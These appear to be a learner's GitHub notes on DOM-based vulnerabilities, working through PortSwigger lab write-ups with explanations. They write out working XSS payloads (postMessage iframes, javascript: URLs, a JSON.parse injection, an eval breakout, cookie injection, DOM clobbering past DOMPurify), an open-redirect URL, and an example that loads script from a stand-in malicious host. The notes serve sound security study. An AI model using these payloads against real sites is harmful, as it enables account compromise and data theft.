## DOM-Based Vulnerabilities 

### Miscellaneous Uncs
- **Source**: A JavaScript property that allows an attacker to control data, where the untrusted input enters the application.
  - Examples: `location.search` (URL query parameters), `document.referrer`, `document.cookie`
  - Common sources:`document.URL`, `document.URI`, `document.base`, `location`,`document.cookie`, `document.referrer`, `window.name`, `history.pushState`, `history.replaceState`, `localStorage`, `sessionStorage`, `IndexedDB`, `Database`
- **Sink**: A function or a DOM object that allows code execution or renders HTML. This is where the untrusted input causes the damage.
  - Examples: `eval()`, `innerHTML`, `document.write()`
- DOM clobbering is when you inject HTML into a page to manipulate the DOm and change the behavior of the JavaScript on the site. Most common form uses an anchor element to overwrite a global variable that is used by the application in an unsafe way, such as generating a dynamic script URL.
  - For DOM clobbering to work, there must be a "hole" in the JavaScript. The browser logic works like this: Did the developer define a variable named X? If yes, the browser uses the developer's variable (`let X`, `var X`, `const X`, function arguments, etc.). If not, is there an HTML element with `id='X'`? If yes, the browser uses the HTML element .. so you win! Basically, if you can fill the hole with a legitimate JavaScript variable first, you cannot clobber as the browser will never look at your malicious HTML element. What you need to do is find a spot where the developer checks for a variable that does not exist yet.\
- JavaScript notes:
  - `var` is function-scoped, hoisted and initialized in undefined. Allows redeclaration. Hoisted, like an elevator, means the browser moves your variable declarations to the top of the code before running it. So, for `var`, the browser sees `var x` at the bottom of your code, it lifts the name `x` to the top, and it gives it a placeholder value of `undefined`. This won't cause a crash if you try and print it before you define it - it will just say `undefined`. 
  - `let` is block-scoped, hoisted but not initialized. Assessing `let` variables before declaration results in `ReferenceError`, doesn't allow redeclaration within same scope. Similar to `var`, `let` is hoisted, but it is not initialized (creates "Temporal Dead Zone") - if you try to print it before you define it, you will get a `Reference error`. 
  - `const` is also block-scoped, hoisted but not initialized. Once assigned, `const` cannot be reassigned, however, it holds an object or array, the properties can still be modified. More on this: you can create a box labeled 'myUser' `const myUser = { name: "Alice"};`. Illegally, you cannot try and point the label to a new box, like `myUser = { name: "Bob"};` ERROR!, but you can change the contents of the existing box, like `myUser.name = "Bob";`. 

```
function test() {
  if (true) {
    var a = "I bleed out!";
    let b = "I stay inside!";
  }
console.log(a); // Works! Prints "I bleed out!"
console.log(b); // ERROR! "b" is not defined. It died inside the curly braces.
}
```

#### Lab: DOM XSS Using Web Messages
- Exploit server to post a message to the target site that causes the `print()` function to be called.
- When I loaded the lab, I noticed this odd `[object Object` that was appearing at the top of the homepage. I reviewed the source code, and I saw the following JavaScript. I recognized the `innerHTML` as bad immediately. So it's getting the document with element id of `ads`. Unlike the resource available at https://portswigger.net/web-security/dom-based/controlling-the-web-message-source, this is not being passed into an `eval()` function.
- The issue here is that the  event listener does not verify the origin of the message, and the postMessage() from the iframe specifies targetOrigin as *, the event listener accepts the payload and passes it into the sink.
```
<script>
                        window.addEventListener('message', function(e) {
                            document.getElementById('ads').innerHTML = e.data;
                        })
                    </script>
```
- So let's construct an iframe ... at first, I was really confused because I could not get the script tags to work. Then I found this: "The `innerHTML` sink doesn't accept `script` elements on any modern browser, nor will `svg onload` events fire. This means you will need to use alternative elements like `img` or `iframe`. Event handlers such as `onload` and `onerror` can be used in conjunction with these elements."
  - I started with `<iframe src="https://0a8b009b04034dbd81757127009a00ac.web-security-academy.net/" width="2000" height="2000" onload="this.contentWindow.postMessage('</div></div><script>print()</script>','*')">`, and then I transformed it to this: `<iframe src="https://0a8b009b04034dbd81757127009a00ac.web-security-academy.net/" width="2000" height="2000" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">` which solved the lab (resulting in the print popup window!). 
<img width="2542" height="1353" alt="image" src="https://github.com/user-attachments/assets/47ecf6a9-5ae3-4025-9725-c6f0af766487" />
- When I revisted this lab, I went with this payload
```
<iframe src="https://0ad100d3038832aa803003be0024007b.web-security-academy.net/" onload="this.contentWindow.postMessage('<audio src/onerror=print()>','*')">
```

#### Lab: DOM XSS Using Web Messages and JavaScript URL
- I knew it was a DOM-based redirection vulnerability through web messaging, so I just needed to locate it. I noticed there was comment functionality on the blog posts of the web app, so I focused there.
- The comment functionality allows a user to provide a website, which is then linked to the username. Upon pressing the username, the user is redirected to the website ... this must be where the vulnerability is. Let's take a look...wait, there's no web messaging functionality here. This must not be it. Good place to look for another lab, but let's move on ...
- Ah, I found it on the homepage...there's the sink, `location.href`, which is the full URL of the current page. We know that we need to construct an HTML page on the exploit server to solve this lab:
```

                        window.addEventListener('message', function(e) {
                            var url = e.data;
                            if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
                                location.href = url;
                            }
                        }, false);

```
- I struggled with constructing the payload here. I knew it needed to have `https:` or `http:`, and I knew it was a JavaScript URL. I attempted `<iframe src="https://0aad00b0039dc1f980ba1c2e003f00ae.web-security-academy.net/" width="2000" height="2000" onload="this.contentWindow.postMessage('javascript:print(); http:','*')">` thinking the semicolon would terminate it, but I wasn't really considering the rest of the message - the http:. What I needed to do instead was comment out the rest with JavaScript comment, `//`, to prevent a syntax error or whatever that was causing the failure on my origina attempt ... so the final payload is `<iframe src="https://0aad00b0039dc1f980ba1c2e003f00ae.web-security-academy.net/" width="2000" height="2000" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">`.
- Upon revisit, this is the payload I went with: `<iframe src="https://0a2600d103c8e3b080ab1d2600de0074.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()// http:','*')">`

#### Lab: DOM XSS Using Web Messages and `JSON.parse`
- `JSON.parse()` parses a JSON string, constructing the JS value or object described by the string. Example, `const json = '{"result":true, "count":42}'; const obj = JSON.parse(json); console.log(obj.count);` would result in 42. `obj.result` would result in true.
```

                        window.addEventListener('message', function(e) {
                            var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
                            document.body.appendChild(iframe);
                            try {
                                d = JSON.parse(e.data);
                            } catch(e) {
                                return;
                            }
                            switch(d.type) {
                                case "page-load":
                                    ACMEplayer.element.scrollIntoView();
                                    break;
                                case "load-channel":
                                    ACMEplayer.element.src = d.url;
                                    break;
                                case "player-height-changed":
                                    ACMEplayer.element.style.width = d.width + "px";
                                    ACMEplayer.element.style.height = d.height + "px";
                                    break;
                            }
                        }, false);
```
- The final payload was `<iframe src=https://0a83008804269a0380e017cb00670089.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>`. What did I learn? You need to backslash quotation marks for JSON, `\"`. I reviewed the code, and I noted that `d.url` could be provided as the JavaScript URL from the previous lab. I can see the cases to assist with the JSON keys...
- When the constructed `iframe` loads, the `postMessage()` method sends a web message to the home page with the type `load-channel`. The event listener receives the message and parses it with `JSON.parse()` before sending it to the switch.
- The switch triggers `load-channel` case, which assigns the `url` property of the message to the `src` attribute of the ACMEplayer.element `iframe`. However, in our case, the `url` property of the message was actually a JavaScript payload. 
- **Why does this happen?** The event handler does not contain any form of origin check and the second argument specifics that any targetOrigin is allowed for the web message.

#### Lab: Reflected DOM XSS
- I navigated to the Debugger, and I reviewed the JavaScript file titled 'searchResults.js'. During this time, I got distracted, and I basically forgot to examine the requests coming into Burp altogether. This would be a mistake. 
- If I had paid attention, I would've noticed my search term is displayed as part of JSON. Reviewing searchResultsjs, we see this: `eval('var searchResultsObj = ' + this.responseText);`. Reminder, XHR is XML HTTP Request which is an API in the form of a JavaScript object to transmit HTTP method requests from a web browser to a web server. 
- To break out of the JSON, I had to experiment with quotes and backslashes: `/search-results?search=\"\}test`
![alt text](<Photos/2025-08-31 21_55_27-Burp Suite Community Edition v2025.7.4 - Temporary Project.png>)
![alt text](<Photos/2025-08-31 21_56_56-Burp Suite Community Edition v2025.7.4 - Temporary Project.png>)
- Final payload ended up being `search=\"-alert(1)}//`. As the site is not escaping our injected backslask, when the JSON response attempts to escape the opening double-quotes character, it adds a second backslash. The resulting double backslash causes the escape to effectively be canceled out. This means the double-quotes are processed unescaped, which closes the string that should contain the search term. 
- An arithmetic operator, in this case a subtraction operator, is then used to separate the expressions before the `alert()` function is called. Finally, a closing curly bracket and two forward slashes close the JSON object early and comment out what would have been the rest of the object. I tried it again with another arithmetic operator, and I found it worked, `\"+alert(1)}//`. 
- eval() is dangerous because it evalutes or executes an argument.

#### Lab: DOM-Based Open Redirection
- `https://0a1900420319cd93805203df00460069.web-security-academy.net/post?postId=4&url=https://exploit-0aaf008f0383cd0e80ea02e6016500db.exploit-server.net/exploit#`

#### DOM-based Cookie Manipulation
- Based on the name, I knew I was looking for some cookie shenanigans. I noticed the value of 'lastViewedProduct' included a URL to the last viewed product (of course). So we have our source, where is our sink?
- Found it! We can see JavaScript that says the following. So I found the issue, but I'm actually a bit unsure how to craft the payload ... let's think:
```
<script>
  document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
</script>
```
- I began with a very simple payload which did not work, and I was also informed in the lab instructions that I will need my exploit server (later): `https://0ab2002103e93f1e801f2bbb007100b5.web-security-academy.net/product?productId=6&<script>print()</script>` which was encoded into `https://0ab2002103e93f1e801f2bbb007100b5.web-security-academy.net/product?productId=6&%3Cscript%3Eprint()%3C/script%3E`.
- The issue with this payload is that it just isn't expecting to execute JavaScript here, so we need to close out this href. 
<img width="788" height="164" alt="image" src="https://github.com/user-attachments/assets/78c27ad4-694f-4b00-bfeb-a25ce4f0ac28"/>

* My second payload did not work either: `"><script>print()</script>`
Why? Well, I was looking at the Elements tab and not the Sources tab. The Elements tab is the DOM tree that the browser has rebuilt, and it has been tidied and changed by the browser. In the actual sources tab, we can see that they use single quotes for the a href so I need to actually close it with single quotes.
- Okie! Now that we have the very simple payload, just appending `'><script>print()</script>`, we now have to use our exploit server to deliver this to a victim. Final payload which solved the lab was: `<iframe src="https://0ab2002103e93f1e801f2bbb007100b5.web-security-academy.net/product?productId=4&'><script>print()</script>", width="2000" height="2000", '*'>`

#### Exploiting DOM clobbering to enable XSS
- Technique where you inject HTML into a page to manipulate the DOM and ultimately change the behavior of the JavaScript on the page. Particularly useful in cases where XSS is not possible, but you can control some HTML on a page where the attributes `id` or `name` are whitelisted by the HTML filter. Most common form of DOM clobbering uses an anchor element to overwrite a global variable, which is then used by the application in an unsafe way, such as generating a dynamic script URL.
- A common pattern used by JavaScript developers is `var someObject = window.someObject || {};`. If you can control some of the HTML on the page, you can clobber the `someObject` reference with a DOM node, such as an anchor. Consider the following code:
```
<script>
  window.onload = function(){
    let someObject = window.someObject || {};
    let script = document.createElement('script');
    script.src = someObject.url;
    document.body.appendChild(script);
  };
</script>
```
- To exploit the above code, you could inject the following HTML to clobber the `someObject` reference with an anchor element: `<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js`. As the two anchors use the same ID, the DOM groups them together in a DOM collection. The DOM clobbering vector then overwrites the 'someObject' reference with the DOM collection. A `name` attribute is used on the last anchor element in order to clobber the `url` property of the `someObject` object, which points to an external script.
- I got confused here in the notes about why we had to make a collection and why a singular anchor object wasn't going to work ... well, when we use two, we create a collection. HTMLCollections has a special feature where the browser searches inside the collection for an element. So for example, a singular anchor tag, like `<a id="someObject" name ="url" href="//malicious.com">`, when JavaScript runs `someObject.url`, the browser finds the ID someObject and it returns an `HTMLAnchorElement` object. The code then tries to read the property `url` on the anchor elemnt, but does the HTML anchor tag have a standard property called `url`? No, it has `href`, `host`, `search`, but not `url`. So this causes `someObject.url` 
  - Okay, now what do we do about this? Well, a collection behaves differently! Now, if we do: `<a id="someObject"> <a id="someObject" name="url" href="//malicious.com">`. The browser now finds two elements with the same ID, it cannot just return one, so it bundles them into an `HTMLCollection` which is essentially an array. Now, the code tries to read the property `url` on the Collection, but `HTMLCollections` has a special feature. If you try to access a property on a collection (like `.url`), the browser searches inside the collection for an element with the `name="url"`. Browser logic is "do I have an element inside me named `url`? Yes! The second anchor."
- Now it's time for the lab - we know that "safe HTML" is allowed for the comment, and we just learned about clobbering with collections. So am I able to clobber through a comment that clobbers the "website" href ... first mistake! When I take a look at the JS (shown below), the websiteElement is a local variable, not a global (hence "let"). It is able to look into the script itself to find the websiteElement, so we must look elsewhere. 
```
let websiteElement = document.createElement("a");
                    websiteElement.setAttribute("id", "author");
                    websiteElement.setAttribute("href", comment.website);
                    firstPElement.appendChild(websiteElement)
```
- I continued to examine the JavaScript, and I found a line with our suspicious OR (`||`) syntax...
```
let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
let avatarImgHTML = '<img class="avatar" src="' + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + '">';
```
- Breaking down the above, it's a Ternary Operator (the `?` and `:` to verify if the comment has its own avatar or needs a default one. `(comment.avatar ? ... : ...)` is an `if/else` statement that asks "Does this specific comment have a custom avatar defined in the database? If yes (TRUE), it runs the following: `escapeHTML(comment.avatar)` and if not, it runs `defaultAvatar.avatar`. Now, if a user provides the avatar, it is wrapped in `escapeHTML(...)` which renders malicious characters harmless. If the code falls back to the default, it uses `defaultAvatar.avatar`. 
- My initial payload results in a broken image icon - I forgot that modern browsers do not execute JavaScript inside the `src` attribute of an `<img>` tag. We have to break out of it and add our own event handler `<a id="defaultAvatar"><a id="defaultAvatar" name="avatar" href="javascript:alert()">`...
- Let's think this through, we need the injected HTML to look like this: `<img src="x" onerror="alert()">`, and to do this, we need our `href` payload to carry double quotes within it ... `<a id="defaultAvatar"><a id="defaultAvatar" name="avatar" href="cid:&quot;onerror=alert(1)//"></a></a>`
- `&quot` is an HTML entity used to represent a double quotation mark. This entire payload was confusing to me, but PS gave some explanation after solving:
  * The page for a specific blog post imports the JS file `loadCommentsWithDombClobber.js` which contains the following code: `let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}` The `defaultAvatar` object is implemented using this dangerous pattern containing the logical `OR` operator in conjunction with a global variable, making it vulnerable to DOM clobbering.
  * You can clobber this object using anchor tags. Creating two anchors with the same ID causes them to be grouped in a DOM collection. The `name` attribute in the second anchor contains the value `"avatar"` which will clobber the `avatar` property with the contents of the `href` attribute.
  * Notice that the site uses the DOMPurify filter in an attempt to reduce DOM-based vulnerabilities. However, DOMPurify does allow you to use the `cid:` protocol, which does not URL-encode double-quotes. This means you can inject an encoded double-quote that will be decoded at runtime. As a result, the injection described above will cause the `defaultAvatar` variable to be assigned to the clobbered property `{avatar: 'cid:"onerror=alert(1)//'} the next time the page is loaded.
    * I looked into this more - default protocols allowed by DOMPurify are `http:`, `https:`, `mailto:`, `tel:`, `ftp:`, `ftps:`, `callto:`, `cid:`, `xmpp:`, `sms:`.
    * We had to use `&quot;` instead of an actual " as an " would close the href attribute and our payload would just be injected like this: `"cid:"`. Using `<a href="cid:&quot;onerror=alert(1)//">` starts the anchor with `<a`, opens the attribute at `href="...`, reads text `cid:`, sees `&quot;` which the parser says "Ah, this isn't a code syntax quote, this is just a symbol representing a quote - it keeps the attribute open. Finally hits the real closing quote at the end.
      * Once the browser finishes building the DOM element, it automatically decodes `&quot;` back into a real " inside the computer's memory.
  * When you make a second post, the browser uses the newly-clobbered global variable, which smuggles the payload in the `onerror` event handler and triggers the `alert()`. 

#### C
